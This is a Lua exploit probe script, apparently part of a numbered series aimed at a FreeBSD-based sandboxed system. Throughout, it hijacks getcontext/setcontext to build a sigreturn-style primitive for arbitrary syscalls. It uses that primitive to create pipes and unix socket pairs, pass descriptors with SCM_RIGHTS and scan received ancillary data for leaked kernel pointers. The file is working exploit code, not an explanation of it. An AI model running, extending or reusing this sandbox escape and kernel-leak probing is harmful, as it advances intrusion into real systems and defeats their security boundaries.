-- CRASH_CLASS: LOW
-- PROBE 149a: socketpair + pipe + SCM_RIGHTS + sendmsg ancillary data
--
-- 148a confirmed: socketpair(AF_UNIX, SOCK_STREAM) works (fds 24,25)
-- Test: pipe via SROP, SCM_RIGHTS fd passing, recvmsg for kernel pointer leaks,
-- and MSG_PEEK/MSG_DONTWAIT on unix sockets for timing side channels.

print("=== PROBE 149a: SOCKET+PIPE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)

-- [A] pipe via SROP
print("--- [A] PIPE ---")
local pipefds = gpu + 0x1000
wq(pipefds, uint64(0))
local pipefds_a = uint64(string.format("0x%X%08X", gh, gl + 0x1000))

-- pipe2(fds, 0) = syscall 542 (FreeBSD 10+)
local pr = srop(542, pipefds_a, uint64(0))
local p0 = to_num(memory.read_dword(pipefds))
local p1 = to_num(memory.read_dword(pipefds + 4))
print("pipe2=" .. (pr and tostring(to_num(pr)) or "nil") .. " fds=" .. p0 .. "," .. p1)

-- Also try pipe(42)
wq(pipefds, uint64(0))
local pr2 = srop(42, pipefds_a)
local p2a = to_num(memory.read_dword(pipefds))
local p2b = to_num(memory.read_dword(pipefds + 4))
print("pipe=" .. (pr2 and tostring(to_num(pr2)) or "nil") .. " fds=" .. p2a .. "," .. p2b)

-- If pipe works, write and read
local pipe_rd = -1
local pipe_wr = -1
if p0 > 0 or p2a > 0 then
    if p0 > 0 then
        pipe_rd = p0
        pipe_wr = p1
    else
        pipe_rd = p2a
        pipe_wr = p2b
    end

    -- write(pipe_wr, buf, 8)
    local wbuf = gpu + 0x2000
    wq(wbuf, uint64("0xDEADBEEFCAFEBABE"))
    local wbuf_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000))
    local wr = srop(4, uint64(pipe_wr), wbuf_a, uint64(8))
    print("write=" .. (wr and tostring(to_num(wr)) or "nil"))

    -- read(pipe_rd, buf, 8)
    local rbuf = gpu + 0x3000
    wq(rbuf, uint64(0))
    local rbuf_a = uint64(string.format("0x%X%08X", gh, gl + 0x3000))
    local rd = srop(3, uint64(pipe_rd), rbuf_a, uint64(8))
    print("read=" .. (rd and tostring(to_num(rd)) or "nil"))
    local rval = memory.read_qword(rbuf)
    local rvh, rvl = get_hi_lo(rval)
    print("got=0x" .. string.format("%X%08X", rvh, rvl))
end

-- [B] socketpair + SCM_RIGHTS
print("")
print("--- [B] SCM_RIGHTS ---")
local sv = gpu + 0x4000
wq(sv, uint64(0))
local sv_a = uint64(string.format("0x%X%08X", gh, gl + 0x4000))

local sp = srop(135, uint64(1), uint64(1), uint64(0), sv_a)
print("socketpair=" .. (sp and tostring(to_num(sp)) or "nil"))

if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))
    print("s0=" .. s0 .. " s1=" .. s1)

    -- Send an fd via SCM_RIGHTS over the unix socket
    -- sendmsg = syscall 28
    -- We need to construct: struct msghdr + struct cmsghdr + fd payload

    -- struct msghdr {
    --   void *msg_name;        +0x00 (8)
    --   socklen_t msg_namelen; +0x08 (4) + 4 padding
    --   struct iovec *msg_iov; +0x10 (8)
    --   int msg_iovlen;        +0x18 (4) + 4 padding
    --   void *msg_control;     +0x20 (8)
    --   socklen_t msg_controllen; +0x28 (4) + 4 padding
    --   int msg_flags;         +0x30 (4) + 4 padding
    -- } = 0x38 bytes

    -- struct cmsghdr {
    --   socklen_t cmsg_len;    +0x00 (4)
    --   int cmsg_level;        +0x04 (4) = SOL_SOCKET = 0xFFFF
    --   int cmsg_type;         +0x08 (4) = SCM_RIGHTS = 1
    --   /* followed by data: int fd */
    -- }
    -- Total cmsghdr + 1 fd = 12 + 4 = 16 bytes
    -- But CMSG_LEN(sizeof(int)) = 16 on 64-bit (aligned)

    local msghdr = gpu + 0x5000
    local iov = gpu + 0x5100
    local cmsg = gpu + 0x5200
    local iobuf = gpu + 0x5300

    -- Create a test fd to send (open /dev/null or use existing shm fd)
    local name = gpu + 0x6000
    wd(name, 0x7374742F) -- "/tts" (wrong but harmless)
    wd(name + 4, 0x00003174)
    local name_a = uint64(string.format("0x%X%08X", gh, gl + 0x6000))
    local test_fd_r = srop(482, name_a, uint64(0x0202), uint64(0x1B6))
    local test_fd = test_fd_r and to_num(test_fd_r) or -1
    print("test_fd=" .. test_fd)

    -- IOV: 1 byte of data (minimum for sendmsg)
    pcall(function() memory.write_dword(iobuf, 0x41) end) -- 'A'
    local iobuf_a = uint64(string.format("0x%X%08X", gh, gl + 0x5300))
    local iov_a = uint64(string.format("0x%X%08X", gh, gl + 0x5100))
    wq(iov, iobuf_a) -- iov_base
    wq(iov + 8, uint64(1)) -- iov_len

    -- CMSG: SCM_RIGHTS with test_fd
    local cmsg_a = uint64(string.format("0x%X%08X", gh, gl + 0x5200))
    -- cmsg_len = CMSG_LEN(4) = 16 on 64-bit FreeBSD
    -- Actually on FreeBSD amd64, CMSG_LEN(4) = sizeof(struct cmsghdr) + 4
    -- sizeof(struct cmsghdr) = 12 (not padded to 16 for the struct itself)
    -- But CMSG_SPACE rounds up. cmsg_len should be 16.
    wd(cmsg, 16) -- cmsg_len (12 + sizeof(int))
    wd(cmsg + 4, 0xFFFF) -- cmsg_level = SOL_SOCKET
    wd(cmsg + 8, 1) -- cmsg_type = SCM_RIGHTS
    wd(cmsg + 12, test_fd) -- the fd to send

    -- msghdr
    local msghdr_a = uint64(string.format("0x%X%08X", gh, gl + 0x5000))
    wq(msghdr, uint64(0)) -- msg_name = NULL
    wd(msghdr + 8, 0) -- msg_namelen
    wq(msghdr + 0x10, iov_a) -- msg_iov
    wd(msghdr + 0x18, 1) -- msg_iovlen
    wq(msghdr + 0x20, cmsg_a) -- msg_control
    wd(msghdr + 0x28, 16) -- msg_controllen = CMSG_SPACE(4)
    wd(msghdr + 0x30, 0) -- msg_flags

    -- sendmsg(s0, msghdr, 0)
    local sm = srop(28, uint64(s0), msghdr_a, uint64(0))
    print("sendmsg=" .. (sm and tostring(to_num(sm)) or "nil"))

    -- recvmsg(s1, recv_msghdr, 0)
    local rmsghdr = gpu + 0x7000
    local riov = gpu + 0x7100
    local rcmsg = gpu + 0x7200
    local riobuf = gpu + 0x7300

    wq(riobuf, uint64(0))
    local riobuf_a = uint64(string.format("0x%X%08X", gh, gl + 0x7300))
    local riov_a = uint64(string.format("0x%X%08X", gh, gl + 0x7100))
    wq(riov, riobuf_a)
    wq(riov + 8, uint64(64))

    local rcmsg_a = uint64(string.format("0x%X%08X", gh, gl + 0x7200))
    for off = 0, 63, 4 do wd(gpu + 0x7200 + off, 0) end

    local rmsghdr_a = uint64(string.format("0x%X%08X", gh, gl + 0x7000))
    wq(rmsghdr, uint64(0))
    wd(rmsghdr + 8, 0)
    wq(rmsghdr + 0x10, riov_a)
    wd(rmsghdr + 0x18, 1)
    wq(rmsghdr + 0x20, rcmsg_a)
    wd(rmsghdr + 0x28, 64) -- generous controllen
    wd(rmsghdr + 0x30, 0)

    local rm = srop(27, uint64(s1), rmsghdr_a, uint64(0))
    print("recvmsg=" .. (rm and tostring(to_num(rm)) or "nil"))

    -- Check received cmsg
    local rcmsg_len = to_num(memory.read_dword(gpu + 0x7200))
    local rcmsg_level = to_num(memory.read_dword(gpu + 0x7204))
    local rcmsg_type = to_num(memory.read_dword(gpu + 0x7208))
    local rcmsg_fd = to_num(memory.read_dword(gpu + 0x720C))
    print("cmsg_len=" .. rcmsg_len .. " level=0x" .. string.format("%X", rcmsg_level)
        .. " type=" .. rcmsg_type .. " fd=" .. rcmsg_fd)

    if rcmsg_fd > 0 then
        print("*** SCM_RIGHTS WORKS ***")
    end

    -- Scan ancillary data for kernel pointers
    for off = 0, 60, 4 do
        local v = to_num(memory.read_dword(gpu + 0x7200 + off))
        if v ~= 0 then
            print("  cmsg+" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
        end
    end

    -- [C] Receive with large control buffer — check for leaked data
    print("")
    print("--- [C] LARGE CMSG ---")

    -- Send another message with no cmsg (just data)
    wd(msghdr + 0x28, 0) -- no control data
    wq(msghdr + 0x20, uint64(0))
    pcall(function() memory.write_dword(iobuf, 0x42) end)
    srop(28, uint64(s0), msghdr_a, uint64(0))

    -- Receive with oversized control buffer
    local bigcmsg = gpu + 0x8000
    for off = 0, 0xFF, 4 do wd(bigcmsg + off, 0xCCCCCCCC) end
    local bigcmsg_a = uint64(string.format("0x%X%08X", gh, gl + 0x8000))

    wq(rmsghdr + 0x20, bigcmsg_a)
    wd(rmsghdr + 0x28, 256)

    srop(27, uint64(s1), rmsghdr_a, uint64(0))

    -- Check what was written to the control buffer
    local written = 0
    for off = 0, 0xFC, 4 do
        local v = to_num(memory.read_dword(bigcmsg + off))
        if v ~= 0xCCCCCCCC then
            written = written + 1
            if written <= 8 then
                print("  big+" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
            end
        end
    end
    print("cmsg_modified=" .. written .. " dwords")

    -- Check for kernel pointers in received data
    for off = 0, 0xF8, 8 do
        local ok2, v = pcall(function() return memory.read_qword(bigcmsg + off) end)
        if ok2 then
            local h, l = get_hi_lo(v)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print("  *** KPTR cmsg+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
            end
        end
    end

    -- Close sockets
    srop(6, uint64(s0))
    srop(6, uint64(s1))
    if test_fd >= 0 then srop(6, uint64(test_fd)) end
end

-- [D] SOCK_DGRAM socketpair
print("")
print("--- [D] DGRAM ---")
wq(sv, uint64(0))
local sp2 = srop(135, uint64(1), uint64(2), uint64(0), sv_a)
print("dgram_pair=" .. (sp2 and tostring(to_num(sp2)) or "nil"))
if sp2 and to_num(sp2) == 0 then
    local d0 = to_num(memory.read_dword(sv))
    local d1 = to_num(memory.read_dword(sv + 4))
    print("d0=" .. d0 .. " d1=" .. d1)
    srop(6, uint64(d0))
    srop(6, uint64(d1))
end

-- [E] SOCK_SEQPACKET
wq(sv, uint64(0))
local sp3 = srop(135, uint64(1), uint64(5), uint64(0), sv_a)
print("seqpacket=" .. (sp3 and tostring(to_num(sp3)) or "nil"))
if sp3 and to_num(sp3) == 0 then
    local q0 = to_num(memory.read_dword(sv))
    local q1 = to_num(memory.read_dword(sv + 4))
    print("q0=" .. q0 .. " q1=" .. q1)
    srop(6, uint64(q0))
    srop(6, uint64(q1))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
